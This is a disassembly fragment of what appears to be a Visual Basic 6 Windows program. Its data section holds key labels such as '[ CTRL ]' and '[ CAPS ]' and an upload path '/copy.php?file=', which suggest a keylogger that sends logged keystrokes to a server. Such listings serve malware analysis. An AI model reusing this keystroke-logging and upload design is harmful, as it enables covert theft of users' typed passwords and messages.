  403382:	00 00                	add    %al,(%eax)
  403384:	02 00                	add    (%eax),%al
  403386:	00 00                	add    %al,(%eax)
  403388:	7c 00                	jl     0x40338a
  40338a:	00 00                	add    %al,(%eax)
  40338c:	02 00                	add    (%eax),%al
  40338e:	00 00                	add    %al,(%eax)
  403390:	3b 00                	cmp    (%eax),%eax
  403392:	00 00                	add    %al,(%eax)
  403394:	02 00                	add    (%eax),%al
  403396:	00 00                	add    %al,(%eax)
  403398:	2c 00                	sub    $0x0,%al
  40339a:	00 00                	add    %al,(%eax)
  40339c:	02 00                	add    (%eax),%al
  40339e:	00 00                	add    %al,(%eax)
  4033a0:	3a 00                	cmp    (%eax),%al
  4033a2:	00 00                	add    %al,(%eax)
  4033a4:	02 00                	add    (%eax),%al
  4033a6:	00 00                	add    %al,(%eax)
  4033a8:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4033a9:	00 00                	add    %al,(%eax)
  4033ab:	00 02                	add    %al,(%edx)
  4033ad:	00 00                	add    %al,(%eax)
  4033af:	00 f9                	add    %bh,%cl
  4033b1:	00 00                	add    %al,(%eax)
  4033b3:	00 02                	add    %al,(%edx)
  4033b5:	00 00                	add    %al,(%eax)
  4033b7:	00 e9                	add    %ch,%cl
  4033b9:	00 00                	add    %al,(%eax)
  4033bb:	00 02                	add    %al,(%edx)
  4033bd:	00 00                	add    %al,(%eax)
  4033bf:	00 e8                	add    %ch,%al
  4033c1:	00 00                	add    %al,(%eax)
  4033c3:	00 02                	add    %al,(%edx)
  4033c5:	00 00                	add    %al,(%eax)
  4033c7:	00 b0 00 00 00 02    	add    %dh,0x2000000(%eax)
  4033cd:	00 00                	add    %al,(%eax)
  4033cf:	00 e0                	add    %ah,%al
  4033d1:	00 00                	add    %al,(%eax)
  4033d3:	00 02                	add    %al,(%edx)
  4033d5:	00 00                	add    %al,(%eax)
  4033d7:	00 3f                	add    %bh,(%edi)
  4033d9:	00 00                	add    %al,(%eax)
  4033db:	00 02                	add    %al,(%edx)
  4033dd:	00 00                	add    %al,(%eax)
  4033df:	00 27                	add    %ah,(%edi)
  4033e1:	00 00                	add    %al,(%eax)
  4033e3:	00 02                	add    %al,(%edx)
  4033e5:	00 00                	add    %al,(%eax)
  4033e7:	00 5e 00             	add    %bl,0x0(%esi)
  4033ea:	00 00                	add    %al,(%eax)
  4033ec:	02 00                	add    (%eax),%al
  4033ee:	00 00                	add    %al,(%eax)
  4033f0:	ec                   	in     (%dx),%al
  4033f1:	00 00                	add    %al,(%eax)
  4033f3:	00 02                	add    %al,(%edx)
  4033f5:	00 00                	add    %al,(%eax)
  4033f7:	00 e7                	add    %ah,%bh
  4033f9:	00 00                	add    %al,(%eax)
  4033fb:	00 02                	add    %al,(%edx)
  4033fd:	00 00                	add    %al,(%eax)
  4033ff:	00 f2                	add    %dh,%dl
  403401:	00 00                	add    %al,(%eax)
  403403:	00 14 00             	add    %dl,(%eax,%eax,1)
  403406:	00 00                	add    %al,(%eax)
  403408:	20 00                	and    %al,(%eax)
  40340a:	5b                   	pop    %ebx
  40340b:	00 20                	add    %ah,(%eax)
  40340d:	00 43 00             	add    %al,0x0(%ebx)
  403410:	41                   	inc    %ecx
  403411:	00 4e 00             	add    %cl,0x0(%esi)
  403414:	43                   	inc    %ebx
  403415:	00 20                	add    %ah,(%eax)
  403417:	00 5d 00             	add    %bl,0x0(%ebp)
  40341a:	20 00                	and    %al,(%eax)
  40341c:	00 00                	add    %al,(%eax)
  40341e:	00 00                	add    %al,(%eax)
  403420:	12 00                	adc    (%eax),%al
  403422:	00 00                	add    %al,(%eax)
  403424:	20 00                	and    %al,(%eax)
  403426:	5b                   	pop    %ebx
  403427:	00 20                	add    %ah,(%eax)
  403429:	00 54 00 41          	add    %dl,0x41(%eax,%eax,1)
  40342d:	00 42 00             	add    %al,0x0(%edx)
  403430:	20 00                	and    %al,(%eax)
  403432:	5d                   	pop    %ebp
  403433:	00 20                	add    %ah,(%eax)
  403435:	00 00                	add    %al,(%eax)
  403437:	00 12                	add    %dl,(%edx)
  403439:	00 00                	add    %al,(%eax)
  40343b:	00 20                	add    %ah,(%eax)
  40343d:	00 5b 00             	add    %bl,0x0(%ebx)
  403440:	20 00                	and    %al,(%eax)
  403442:	43                   	inc    %ebx
  403443:	00 54 00 52          	add    %dl,0x52(%eax,%eax,1)
  403447:	00 4c 00 20          	add    %cl,0x20(%eax,%eax,1)
  40344b:	00 5d 00             	add    %bl,0x0(%ebp)
  40344e:	00 00                	add    %al,(%eax)
  403450:	12 00                	adc    (%eax),%al
  403452:	00 00                	add    %al,(%eax)
  403454:	20 00                	and    %al,(%eax)
  403456:	5b                   	pop    %ebx
  403457:	00 20                	add    %ah,(%eax)
  403459:	00 41 00             	add    %al,0x0(%ecx)
  40345c:	4c                   	dec    %esp
  40345d:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  403461:	00 5d 00             	add    %bl,0x0(%ebp)
  403464:	20 00                	and    %al,(%eax)
  403466:	00 00                	add    %al,(%eax)
  403468:	16                   	push   %ss
  403469:	00 00                	add    %al,(%eax)
  40346b:	00 20                	add    %ah,(%eax)
  40346d:	00 5b 00             	add    %bl,0x0(%ebx)
  403470:	20 00                	and    %al,(%eax)
  403472:	50                   	push   %eax
  403473:	00 41 00             	add    %al,0x0(%ecx)
  403476:	55                   	push   %ebp
  403477:	00 53 00             	add    %dl,0x0(%ebx)
  40347a:	45                   	inc    %ebp
  40347b:	00 20                	add    %ah,(%eax)
  40347d:	00 5d 00             	add    %bl,0x0(%ebp)
  403480:	20 00                	and    %al,(%eax)
  403482:	00 00                	add    %al,(%eax)
  403484:	14 00                	adc    $0x0,%al
  403486:	00 00                	add    %al,(%eax)
  403488:	20 00                	and    %al,(%eax)
  40348a:	5b                   	pop    %ebx
  40348b:	00 20                	add    %ah,(%eax)
  40348d:	00 43 00             	add    %al,0x0(%ebx)
  403490:	41                   	inc    %ecx
  403491:	00 50 00             	add    %dl,0x0(%eax)
  403494:	53                   	push   %ebx
  403495:	00 20                	add    %ah,(%eax)
  403497:	00 5d 00             	add    %bl,0x0(%ebp)
  40349a:	20 00                	and    %al,(%eax)
  40349c:	00 00                	add    %al,(%eax)
  40349e:	00 00                	add    %al,(%eax)
  4034a0:	12 00                	adc    (%eax),%al
  4034a2:	00 00                	add    %al,(%eax)
  4034a4:	20 00                	and    %al,(%eax)
  4034a6:	5b                   	pop    %ebx
  4034a7:	00 20                	add    %ah,(%eax)
  4034a9:	00 45 00             	add    %al,0x0(%ebp)
  4034ac:	53                   	push   %ebx
  4034ad:	00 43 00             	add    %al,0x0(%ebx)
  4034b0:	20 00                	and    %al,(%eax)
  4034b2:	5d                   	pop    %ebp
  4034b3:	00 20                	add    %ah,(%eax)
  4034b5:	00 00                	add    %al,(%eax)
  4034b7:	00 02                	add    %al,(%edx)
  4034b9:	00 00                	add    %al,(%eax)
  4034bb:	00 20                	add    %ah,(%eax)
  4034bd:	00 00                	add    %al,(%eax)
  4034bf:	00 18                	add    %bl,(%eax)
  4034c1:	00 00                	add    %al,(%eax)
  4034c3:	00 20                	add    %ah,(%eax)
  4034c5:	00 5b 00             	add    %bl,0x0(%ebx)
  4034c8:	20 00                	and    %al,(%eax)
  4034ca:	50                   	push   %eax
  4034cb:	00 61 00             	add    %ah,0x0(%ecx)
  4034ce:	67 00 65 00          	add    %ah,0x0(%di)
  4034d2:	55                   	push   %ebp
  4034d3:	00 70 00             	add    %dh,0x0(%eax)
  4034d6:	20 00                	and    %al,(%eax)
  4034d8:	5d                   	pop    %ebp
  4034d9:	00 20                	add    %ah,(%eax)
  4034db:	00 00                	add    %al,(%eax)
  4034dd:	00 00                	add    %al,(%eax)
  4034df:	00 1c 00             	add    %bl,(%eax,%eax,1)
  4034e2:	00 00                	add    %al,(%eax)
  4034e4:	20 00                	and    %al,(%eax)
  4034e6:	5b                   	pop    %ebx
  4034e7:	00 20                	add    %ah,(%eax)
  4034e9:	00 50 00             	add    %dl,0x0(%eax)
  4034ec:	61                   	popa
  4034ed:	00 67 00             	add    %ah,0x0(%edi)
  4034f0:	65 00 44 00 6f       	add    %al,%gs:0x6f(%eax,%eax,1)
  4034f5:	00 77 00             	add    %dh,0x0(%edi)
  4034f8:	6e                   	outsb  %ds:(%esi),(%dx)
  4034f9:	00 20                	add    %ah,(%eax)
  4034fb:	00 5d 00             	add    %bl,0x0(%ebp)
  4034fe:	20 00                	and    %al,(%eax)
	...
  403508:	12 00                	adc    (%eax),%al
  40350a:	00 00                	add    %al,(%eax)
  40350c:	20 00                	and    %al,(%eax)
  40350e:	5b                   	pop    %ebx
  40350f:	00 20                	add    %ah,(%eax)
  403511:	00 45 00             	add    %al,0x0(%ebp)
  403514:	4e                   	dec    %esi
  403515:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  403519:	00 5d 00             	add    %bl,0x0(%ebp)
  40351c:	20 00                	and    %al,(%eax)
  40351e:	00 00                	add    %al,(%eax)
  403520:	14 00                	adc    $0x0,%al
  403522:	00 00                	add    %al,(%eax)
  403524:	20 00                	and    %al,(%eax)
  403526:	5b                   	pop    %ebx
  403527:	00 20                	add    %ah,(%eax)
  403529:	00 48 00             	add    %cl,0x0(%eax)
  40352c:	4f                   	dec    %edi
  40352d:	00 4d 00             	add    %cl,0x0(%ebp)
  403530:	45                   	inc    %ebp
  403531:	00 20                	add    %ah,(%eax)
  403533:	00 5d 00             	add    %bl,0x0(%ebp)
  403536:	20 00                	and    %al,(%eax)
  403538:	00 00                	add    %al,(%eax)
  40353a:	00 00                	add    %al,(%eax)
  40353c:	14 00                	adc    $0x0,%al
  40353e:	00 00                	add    %al,(%eax)
  403540:	20 00                	and    %al,(%eax)
  403542:	5b                   	pop    %ebx
  403543:	00 20                	add    %ah,(%eax)
  403545:	00 4c 00 45          	add    %cl,0x45(%eax,%eax,1)
  403549:	00 46 00             	add    %al,0x0(%esi)
  40354c:	54                   	push   %esp
  40354d:	00 20                	add    %ah,(%eax)
  40354f:	00 5d 00             	add    %bl,0x0(%ebp)
  403552:	20 00                	and    %al,(%eax)
  403554:	00 00                	add    %al,(%eax)
  403556:	00 00                	add    %al,(%eax)
  403558:	10 00                	adc    %al,(%eax)
  40355a:	00 00                	add    %al,(%eax)
  40355c:	20 00                	and    %al,(%eax)
  40355e:	5b                   	pop    %ebx
  40355f:	00 20                	add    %ah,(%eax)
  403561:	00 55 00             	add    %dl,0x0(%ebp)
  403564:	50                   	push   %eax
  403565:	00 20                	add    %ah,(%eax)
  403567:	00 5d 00             	add    %bl,0x0(%ebp)
  40356a:	20 00                	and    %al,(%eax)
  40356c:	00 00                	add    %al,(%eax)
  40356e:	00 00                	add    %al,(%eax)
  403570:	16                   	push   %ss
  403571:	00 00                	add    %al,(%eax)
  403573:	00 20                	add    %ah,(%eax)
  403575:	00 5b 00             	add    %bl,0x0(%ebx)
  403578:	20 00                	and    %al,(%eax)
  40357a:	52                   	push   %edx
  40357b:	00 49 00             	add    %cl,0x0(%ecx)
  40357e:	47                   	inc    %edi
  40357f:	00 48 00             	add    %cl,0x0(%eax)
  403582:	54                   	push   %esp
  403583:	00 20                	add    %ah,(%eax)
  403585:	00 5d 00             	add    %bl,0x0(%ebp)
  403588:	20 00                	and    %al,(%eax)
  40358a:	00 00                	add    %al,(%eax)
  40358c:	14 00                	adc    $0x0,%al
  40358e:	00 00                	add    %al,(%eax)
  403590:	20 00                	and    %al,(%eax)
  403592:	5b                   	pop    %ebx
  403593:	00 20                	add    %ah,(%eax)
  403595:	00 44 00 4f          	add    %al,0x4f(%eax,%eax,1)
  403599:	00 57 00             	add    %dl,0x0(%edi)
  40359c:	4e                   	dec    %esi
  40359d:	00 20                	add    %ah,(%eax)
  40359f:	00 5d 00             	add    %bl,0x0(%ebp)
  4035a2:	20 00                	and    %al,(%eax)
  4035a4:	00 00                	add    %al,(%eax)
  4035a6:	00 00                	add    %al,(%eax)
  4035a8:	18 00                	sbb    %al,(%eax)
  4035aa:	00 00                	add    %al,(%eax)
  4035ac:	20 00                	and    %al,(%eax)
  4035ae:	5b                   	pop    %ebx
  4035af:	00 20                	add    %ah,(%eax)
  4035b1:	00 53 00             	add    %dl,0x0(%ebx)
  4035b4:	45                   	inc    %ebp
  4035b5:	00 4c 00 45          	add    %cl,0x45(%eax,%eax,1)
  4035b9:	00 43 00             	add    %al,0x0(%ebx)
  4035bc:	54                   	push   %esp
  4035bd:	00 20                	add    %ah,(%eax)
  4035bf:	00 5d 00             	add    %bl,0x0(%ebp)
  4035c2:	20 00                	and    %al,(%eax)
  4035c4:	00 00                	add    %al,(%eax)
  4035c6:	00 00                	add    %al,(%eax)
  4035c8:	16                   	push   %ss
  4035c9:	00 00                	add    %al,(%eax)
  4035cb:	00 20                	add    %ah,(%eax)
  4035cd:	00 5b 00             	add    %bl,0x0(%ebx)
  4035d0:	20 00                	and    %al,(%eax)
  4035d2:	50                   	push   %eax
  4035d3:	00 52 00             	add    %dl,0x0(%edx)
  4035d6:	49                   	dec    %ecx
  4035d7:	00 4e 00             	add    %cl,0x0(%esi)
  4035da:	54                   	push   %esp
  4035db:	00 20                	add    %ah,(%eax)
  4035dd:	00 5d 00             	add    %bl,0x0(%ebp)
  4035e0:	20 00                	and    %al,(%eax)
  4035e2:	00 00                	add    %al,(%eax)
  4035e4:	12 00                	adc    (%eax),%al
  4035e6:	00 00                	add    %al,(%eax)
  4035e8:	20 00                	and    %al,(%eax)
  4035ea:	5b                   	pop    %ebx
  4035eb:	00 20                	add    %ah,(%eax)
  4035ed:	00 49 00             	add    %cl,0x0(%ecx)
  4035f0:	4e                   	dec    %esi
  4035f1:	00 53 00             	add    %dl,0x0(%ebx)
  4035f4:	20 00                	and    %al,(%eax)
  4035f6:	5d                   	pop    %ebp
  4035f7:	00 20                	add    %ah,(%eax)
  4035f9:	00 00                	add    %al,(%eax)
  4035fb:	00 12                	add    %dl,(%edx)
  4035fd:	00 00                	add    %al,(%eax)
  4035ff:	00 20                	add    %ah,(%eax)
  403601:	00 5b 00             	add    %bl,0x0(%ebx)
  403604:	20 00                	and    %al,(%eax)
  403606:	44                   	inc    %esp
  403607:	00 45 00             	add    %al,0x0(%ebp)
  40360a:	4c                   	dec    %esp
  40360b:	00 20                	add    %ah,(%eax)
  40360d:	00 5d 00             	add    %bl,0x0(%ebp)
  403610:	20 00                	and    %al,(%eax)
  403612:	00 00                	add    %al,(%eax)
  403614:	14 00                	adc    $0x0,%al
  403616:	00 00                	add    %al,(%eax)
  403618:	20 00                	and    %al,(%eax)
  40361a:	5b                   	pop    %ebx
  40361b:	00 20                	add    %ah,(%eax)
  40361d:	00 48 00             	add    %cl,0x0(%eax)
  403620:	45                   	inc    %ebp
  403621:	00 4c 00 50          	add    %cl,0x50(%eax,%eax,1)
  403625:	00 20                	add    %ah,(%eax)
  403627:	00 5d 00             	add    %bl,0x0(%ebp)
  40362a:	20 00                	and    %al,(%eax)
  40362c:	00 00                	add    %al,(%eax)
  40362e:	00 00                	add    %al,(%eax)
  403630:	1a 00                	sbb    (%eax),%al
  403632:	00 00                	add    %al,(%eax)
  403634:	20 00                	and    %al,(%eax)
  403636:	5b                   	pop    %ebx
  403637:	00 20                	add    %ah,(%eax)
  403639:	00 57 00             	add    %dl,0x0(%edi)
  40363c:	49                   	dec    %ecx
  40363d:	00 4e 00             	add    %cl,0x0(%esi)
  403640:	44                   	inc    %esp
  403641:	00 4f 00             	add    %cl,0x0(%edi)
  403644:	57                   	push   %edi
  403645:	00 53 00             	add    %dl,0x0(%ebx)
  403648:	20 00                	and    %al,(%eax)
  40364a:	5d                   	pop    %ebp
  40364b:	00 20                	add    %ah,(%eax)
  40364d:	00 00                	add    %al,(%eax)
  40364f:	00 1e                	add    %bl,(%esi)
  403651:	00 00                	add    %al,(%eax)
  403653:	00 2f                	add    %ch,(%edi)
  403655:	00 63 00             	add    %ah,0x0(%ebx)
  403658:	6f                   	outsl  %ds:(%esi),(%dx)
  403659:	00 70 00             	add    %dh,0x0(%eax)
  40365c:	79 00                	jns    0x40365e
  40365e:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  403662:	68 00 70 00 3f       	push   $0x3f007000
  403667:	00 66 00             	add    %ah,0x0(%esi)
  40366a:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  403670:	3d 00 00 00 4c       	cmp    $0x4c000000,%eax
  403675:	00 00                	add    %al,(%eax)
  403677:	00 7b 00             	add    %bh,0x0(%ebx)
  40367a:	35 00 35 00 37       	xor    $0x37003500,%eax
  40367f:	00 43 00             	add    %al,0x0(%ebx)
  403682:	46                   	inc    %esi
  403683:	00 34 00             	add    %dh,(%eax,%eax,1)
  403686:	30 00                	xor    %al,(%eax)
  403688:	31 00                	xor    %eax,(%eax)
  40368a:	2d 00 31 00 41       	sub    $0x41003100,%eax
  40368f:	00 30                	add    %dh,(%eax)
  403691:	00 34 00             	add    %dh,(%eax,%eax,1)
  403694:	2d 00 31 00 31       	sub    $0x31003100,%eax
  403699:	00 44 00 33          	add    %al,0x33(%eax,%eax,1)
  40369d:	00 2d 00 39 00 41    	add    %ch,0x41003900
  4036a3:	00 37                	add    %dh,(%edi)
  4036a5:	00 33                	add    %dh,(%ebx)
  4036a7:	00 2d 00 30 00 30    	add    %ch,0x30003000
  4036ad:	00 30                	add    %dh,(%eax)
  4036af:	00 30                	add    %dh,(%eax)
  4036b1:	00 46 00             	add    %al,0x0(%esi)
  4036b4:	38 00                	cmp    %al,(%eax)
  4036b6:	31 00                	xor    %eax,(%eax)
  4036b8:	45                   	inc    %ebp
  4036b9:	00 46 00             	add    %al,0x0(%esi)
  4036bc:	33 00                	xor    (%eax),%eax
  4036be:	32 00                	xor    (%eax),%al
  4036c0:	45                   	inc    %ebp
  4036c1:	00 7d 00             	add    %bh,0x0(%ebp)
  4036c4:	00 00                	add    %al,(%eax)
  4036c6:	00 00                	add    %al,(%eax)
  4036c8:	4c                   	dec    %esp
  4036c9:	00 00                	add    %al,(%eax)
  4036cb:	00 7b 00             	add    %bh,0x0(%ebx)
  4036ce:	31 00                	xor    %eax,(%eax)
  4036d0:	44                   	inc    %esp
  4036d1:	00 35 00 42 00 45    	add    %dh,0x45004200
  4036d7:	00 34 00             	add    %dh,(%eax,%eax,1)
  4036da:	42                   	inc    %edx
  4036db:	00 35 00 2d 00 46    	add    %dh,0x46002d00
  4036e1:	00 41 00             	add    %al,0x0(%ecx)
  4036e4:	34 00                	xor    $0x0,%al
  4036e6:	41                   	inc    %ecx
  4036e7:	00 2d 00 34 00 35    	add    %ch,0x35003400
  4036ed:	00 32                	add    %dh,(%edx)
  4036ef:	00 44 00 2d          	add    %al,0x2d(%eax,%eax,1)
  4036f3:	00 39                	add    %bh,(%ecx)
  4036f5:	00 43 00             	add    %al,0x0(%ebx)
  4036f8:	44                   	inc    %esp
  4036f9:	00 44 00 2d          	add    %al,0x2d(%eax,%eax,1)
  4036fd:	00 35 00 44 00 42    	add    %dh,0x42004400
  403703:	00 33                	add    %dh,(%ebx)
  403705:	00 35 00 31 00 30    	add    %dh,0x30003100
  40370b:	00 35 00 45 00 37    	add    %dh,0x37004500
  403711:	00 45 00             	add    %al,0x0(%ebp)
  403714:	42                   	inc    %edx
  403715:	00 7d 00             	add    %bh,0x0(%ebp)
  403718:	00 00                	add    %al,(%eax)
  40371a:	00 00                	add    %al,(%eax)
  40371c:	56                   	push   %esi
  40371d:	42                   	inc    %edx
  40371e:	41                   	inc    %ecx
  40371f:	36 2e 44             	ss cs inc %esp
  403722:	4c                   	dec    %esp
  403723:	4c                   	dec    %esp
  403724:	00 00                	add    %al,(%eax)
  403726:	00 00                	add    %al,(%eax)
  403728:	5f                   	pop    %edi
  403729:	5f                   	pop    %edi
  40372a:	76 62                	jbe    0x40378e
  40372c:	61                   	popa
  40372d:	49                   	dec    %ecx
  40372e:	34 56                	xor    $0x56,%al
  403730:	61                   	popa
  403731:	72 00                	jb     0x403733
  403733:	00 5f 5f             	add    %bl,0x5f(%edi)
  403736:	76 62                	jbe    0x40379a
  403738:	61                   	popa
  403739:	4c                   	dec    %esp
  40373a:	61                   	popa
  40373b:	74 65                	je     0x4037a2
  40373d:	49                   	dec    %ecx
  40373e:	64 43                	fs inc %ebx
  403740:	61                   	popa
  403741:	6c                   	insb   (%dx),%es:(%edi)
  403742:	6c                   	insb   (%dx),%es:(%edi)
  403743:	4c                   	dec    %esp
  403744:	64 00 00             	add    %al,%fs:(%eax)
  403747:	00 5f 5f             	add    %bl,0x5f(%edi)
  40374a:	76 62                	jbe    0x4037ae
  40374c:	61                   	popa
  40374d:	4f                   	dec    %edi
  40374e:	62 6a 53             	bound  %ebp,0x53(%edx)
  403751:	65 74 41             	gs je  0x403795
  403754:	64 64 72 65          	fs fs jb 0x4037bd
  403758:	66 00 00             	data16 add %al,(%eax)
  40375b:	00 5f 5f             	add    %bl,0x5f(%edi)
  40375e:	76 62                	jbe    0x4037c2
  403760:	61                   	popa
  403761:	53                   	push   %ebx
  403762:	74 72                	je     0x4037d6
  403764:	56                   	push   %esi
  403765:	61                   	popa
  403766:	72 56                	jb     0x4037be
  403768:	61                   	popa
  403769:	6c                   	insb   (%dx),%es:(%edi)
  40376a:	00 00                	add    %al,(%eax)
  40376c:	5f                   	pop    %edi
  40376d:	5f                   	pop    %edi
  40376e:	76 62                	jbe    0x4037d2
  403770:	61                   	popa
  403771:	55                   	push   %ebp
  403772:	49                   	dec    %ecx
  403773:	31 49 32             	xor    %ecx,0x32(%ecx)
  403776:	00 00                	add    %al,(%eax)
  403778:	8c 2e                	mov    %gs,(%esi)
  40377a:	40                   	inc    %eax
  40377b:	00 b8 a3 40 00 5f    	add    %bh,0x5f0040a3(%eax)
  403781:	5f                   	pop    %edi
  403782:	76 62                	jbe    0x4037e6
  403784:	61                   	popa
  403785:	43                   	inc    %ebx
  403786:	61                   	popa
  403787:	73 74                	jae    0x4037fd
  403789:	4f                   	dec    %edi
  40378a:	62 6a 00             	bound  %ebp,0x0(%edx)
  40378d:	00 00                	add    %al,(%eax)
  40378f:	00 5f 5f             	add    %bl,0x5f(%edi)
  403792:	76 62                	jbe    0x4037f6
  403794:	61                   	popa
  403795:	45                   	inc    %ebp
  403796:	72 72                	jb     0x40380a
  403798:	6f                   	outsl  %ds:(%esi),(%dx)
  403799:	72 4f                	jb     0x4037ea
  40379b:	76 65                	jbe    0x403802
  40379d:	72 66                	jb     0x403805
  40379f:	6c                   	insb   (%dx),%es:(%edi)
  4037a0:	6f                   	outsl  %ds:(%esi),(%dx)
  4037a1:	77 00                	ja     0x4037a3
  4037a3:	00 5f 5f             	add    %bl,0x5f(%edi)
  4037a6:	76 62                	jbe    0x40380a
  4037a8:	61                   	popa
  4037a9:	46                   	inc    %esi
  4037aa:	72 65                	jb     0x403811
  4037ac:	65 4f                	gs dec %edi
  4037ae:	62 6a 4c             	bound  %ebp,0x4c(%edx)
  4037b1:	69 73 74 00 00 00 00 	imul   $0x0,0x74(%ebx),%esi
  4037b8:	5f                   	pop    %edi
  4037b9:	5f                   	pop    %edi
  4037ba:	76 62                	jbe    0x40381e
  4037bc:	61                   	popa
  4037bd:	52                   	push   %edx
  4037be:	38 53 74             	cmp    %dl,0x74(%ebx)
  4037c1:	72 00                	jb     0x4037c3
  4037c3:	00 5f 5f             	add    %bl,0x5f(%edi)
  4037c6:	76 62                	jbe    0x40382a
  4037c8:	61                   	popa
  4037c9:	53                   	push   %ebx
  4037ca:	74 72                	je     0x40383e
  4037cc:	52                   	push   %edx
  4037cd:	38 00                	cmp    %al,(%eax)
  4037cf:	00 5f 5f             	add    %bl,0x5f(%edi)
  4037d2:	76 62                	jbe    0x403836
  4037d4:	61                   	popa
  4037d5:	53                   	push   %ebx
  4037d6:	74 72                	je     0x40384a
  4037d8:	43                   	inc    %ebx
  4037d9:	6d                   	insl   (%dx),%es:(%edi)
  4037da:	70 00                	jo     0x4037dc
  4037dc:	5f                   	pop    %edi
  4037dd:	5f                   	pop    %edi
  4037de:	76 62                	jbe    0x403842
  4037e0:	61                   	popa
  4037e1:	53                   	push   %ebx
  4037e2:	74 72                	je     0x403856
  4037e4:	49                   	dec    %ecx
  4037e5:	32 00                	xor    (%eax),%al
  4037e7:	00 5f 5f             	add    %bl,0x5f(%edi)
  4037ea:	76 62                	jbe    0x40384e
  4037ec:	61                   	popa
  4037ed:	4f                   	dec    %edi
  4037ee:	62 6a 53             	bound  %ebp,0x53(%edx)
  4037f1:	65 74 00             	gs je  0x4037f4
  4037f4:	5f                   	pop    %edi
  4037f5:	5f                   	pop    %edi
  4037f6:	76 62                	jbe    0x40385a
  4037f8:	61                   	popa
  4037f9:	45                   	inc    %ebp
  4037fa:	78 69                	js     0x403865
  4037fc:	74 50                	je     0x40384e
  4037fe:	72 6f                	jb     0x40386f
  403800:	63 00                	arpl   %eax,(%eax)
  403802:	00 00                	add    %al,(%eax)
  403804:	5f                   	pop    %edi
  403805:	5f                   	pop    %edi
  403806:	76 62                	jbe    0x40386a
  403808:	61                   	popa
  403809:	46                   	inc    %esi
  40380a:	69 6c 65 43 6c 6f 73 	imul   $0x65736f6c,0x43(%ebp,%eiz,2),%ebp
  403811:	65 
  403812:	41                   	inc    %ecx
  403813:	6c                   	insb   (%dx),%es:(%edi)
  403814:	6c                   	insb   (%dx),%es:(%edi)
  403815:	00 00                	add    %al,(%eax)
  403817:	00 5f 5f             	add    %bl,0x5f(%edi)
  40381a:	76 62                	jbe    0x40387e
  40381c:	61                   	popa
  40381d:	46                   	inc    %esi
  40381e:	69 6c 65 43 6c 6f 73 	imul   $0x65736f6c,0x43(%ebp,%eiz,2),%ebp
  403825:	65 
  403826:	00 00                	add    %al,(%eax)
  403828:	5f                   	pop    %edi
  403829:	5f                   	pop    %edi
  40382a:	76 62                	jbe    0x40388e
  40382c:	61                   	popa
  40382d:	47                   	inc    %edi
  40382e:	65 74 33             	gs je  0x403864
  403831:	00 00                	add    %al,(%eax)
  403833:	00 5f 5f             	add    %bl,0x5f(%edi)
  403836:	76 62                	jbe    0x40389a
  403838:	61                   	popa
  403839:	46                   	inc    %esi
  40383a:	69 6c 65 4f 70 65 6e 	imul   $0x6e6570,0x4f(%ebp,%eiz,2),%ebp
  403841:	00 
  403842:	00 00                	add    %al,(%eax)
  403844:	5f                   	pop    %edi
  403845:	5f                   	pop    %edi
  403846:	76 62                	jbe    0x4038aa
  403848:	61                   	popa
  403849:	56                   	push   %esi
  40384a:	61                   	popa
  40384b:	72 43                	jb     0x403890
  40384d:	6f                   	outsl  %ds:(%esi),(%dx)
  40384e:	70 79                	jo     0x4038c9
  403850:	00 00                	add    %al,(%eax)
  403852:	00 00                	add    %al,(%eax)
  403854:	5f                   	pop    %edi
  403855:	5f                   	pop    %edi
  403856:	76 62                	jbe    0x4038ba
  403858:	61                   	popa
  403859:	56                   	push   %esi
  40385a:	61                   	popa
  40385b:	72 43                	jb     0x4038a0
  40385d:	61                   	popa
  40385e:	74 00                	je     0x403860
  403860:	5f                   	pop    %edi
  403861:	5f                   	pop    %edi
  403862:	76 62                	jbe    0x4038c6
  403864:	61                   	popa
  403865:	4c                   	dec    %esp
  403866:	73 65                	jae    0x4038cd
  403868:	74 46                	je     0x4038b0
  40386a:	69 78 73 74 72 00 5f 	imul   $0x5f007274,0x73(%eax),%edi
  403871:	5f                   	pop    %edi
  403872:	76 62                	jbe    0x4038d6
  403874:	61                   	popa
  403875:	4c                   	dec    %esp
  403876:	65 6e                	outsb  %gs:(%esi),(%dx)
  403878:	42                   	inc    %edx
  403879:	73 74                	jae    0x4038ef
  40387b:	72 00                	jb     0x40387d
  40387d:	00 00                	add    %al,(%eax)
  40387f:	00 5f 5f             	add    %bl,0x5f(%edi)
  403882:	76 62                	jbe    0x4038e6
  403884:	61                   	popa
  403885:	53                   	push   %ebx
  403886:	74 72                	je     0x4038fa
  403888:	43                   	inc    %ebx
  403889:	61                   	popa
  40388a:	74 00                	je     0x40388c
  40388c:	5f                   	pop    %edi
  40388d:	5f                   	pop    %edi
  40388e:	76 62                	jbe    0x4038f2
  403890:	61                   	popa
  403891:	46                   	inc    %esi
  403892:	72 65                	jb     0x4038f9
  403894:	65 53                	gs push %ebx
  403896:	74 72                	je     0x40390a
  403898:	4c                   	dec    %esp
  403899:	69 73 74 00 00 00 00 	imul   $0x0,0x74(%ebx),%esi
  4038a0:	5f                   	pop    %edi
  4038a1:	5f                   	pop    %edi
  4038a2:	76 62                	jbe    0x403906
  4038a4:	61                   	popa
  4038a5:	53                   	push   %ebx
  4038a6:	74 72                	je     0x40391a
  4038a8:	54                   	push   %esp
  4038a9:	6f                   	outsl  %ds:(%esi),(%dx)
  4038aa:	55                   	push   %ebp
  4038ab:	6e                   	outsb  %ds:(%esi),(%dx)
  4038ac:	69 63 6f 64 65 00 00 	imul   $0x6564,0x6f(%ebx),%esp
  4038b3:	00 5f 5f             	add    %bl,0x5f(%edi)
  4038b6:	76 62                	jbe    0x40391a
  4038b8:	61                   	popa
  4038b9:	53                   	push   %ebx
  4038ba:	65 74 53             	gs je  0x403910
  4038bd:	79 73                	jns    0x403932
  4038bf:	74 65                	je     0x403926
  4038c1:	6d                   	insl   (%dx),%es:(%edi)
  4038c2:	45                   	inc    %ebp
  4038c3:	72 72                	jb     0x403937
  4038c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4038c6:	72 00                	jb     0x4038c8
  4038c8:	5f                   	pop    %edi
  4038c9:	5f                   	pop    %edi
  4038ca:	76 62                	jbe    0x40392e
  4038cc:	61                   	popa
  4038cd:	53                   	push   %ebx
  4038ce:	74 72                	je     0x403942
  4038d0:	54                   	push   %esp
  4038d1:	6f                   	outsl  %ds:(%esi),(%dx)
